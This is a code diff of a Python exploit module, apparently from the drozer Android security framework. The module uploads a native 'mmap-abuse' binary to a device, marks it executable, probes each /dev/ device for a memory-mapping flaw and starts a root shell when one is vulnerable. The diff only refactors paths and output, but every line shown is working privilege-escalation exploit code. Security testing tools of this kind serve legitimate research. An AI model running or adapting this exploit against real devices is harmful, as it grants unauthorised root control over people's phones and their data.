@@ -39,37 +39,35 @@ app_129@android:/data/data/com.mwr.dz #
 
     def exploit(self, arguments):
 
-        # Get private data dir
-        directory = str(self.klass('java.lang.System').getProperty("user.dir"))
-        if "DATA" not in directory.upper():
-            directory = "/data/data/com.mwr.dz"
+        # Get path to binary
+        mmap_abuse = os.path.join(self.workingDir(), "mmap-abuse")
         
         # Remove if it is there
-        self.shellExec("rm " + directory + "/mmap-abuse")
+        self.shellExec("rm %s" % mmap_abuse)
         
         # Upload the exploit
         self.stdout.write("[*] Uploading mmap-abuse\n")
-        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "mmap-abuse", "libs", "armeabi", "mmap-abuse"), directory + "/mmap-abuse")
+        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "mmap-abuse", "libs", "armeabi", "mmap-abuse"), mmap_abuse)
 
         if length != None:
             self.stdout.write("[*] Upload successful\n")
             self.stdout.write("[*] chmod 770 mmap-abuse\n")
-            self.shellExec("chmod 770 " + directory + "/mmap-abuse")
+            self.shellExec("chmod 770 %s" % mmap_abuse)
 
             if arguments.device:
-                self.shellStart(directory + "/mmap-abuse " + arguments.device)
+                self.shellStart("%s %s" % (mmap_abuse, arguments.device))
                 return
 
             # Iterate through all devices
             for device in self.listFiles("/dev/"):
-                device = "/dev/" + str(device)
-                print "[*] Testing " + device
-                status = self.shellExec(directory + "/mmap-abuse " + device + " --test")
+                device = "/dev/" + str(device).strip("/")
+                self.stdout.write("[*] Testing %s\n" % device)
+                status = self.shellExec("%s %s --test" % (mmap_abuse, device))
                 if "Vulnerable" in status:
-                    print "[+] " + device + " is vulnerable!"
-                    print "[+] Enjoy your root shell..."
-                    self.shellStart(directory + "/mmap-abuse " + device)      
+                    self.stdout.write("[+] %s is vulnerable!\n" % device)
+                    self.stdout.write("[+] Enjoy your root shell...\n")
+                    self.shellStart("%s %s" % (mmap_abuse, device))      
                     return 
-            print "[-] No easy root shells here...\n"             
+            self.stdout.write("[-] No easy root shells here...\n\n")             
         else:
             self.stderr.write("[-] Could not upload file\n")
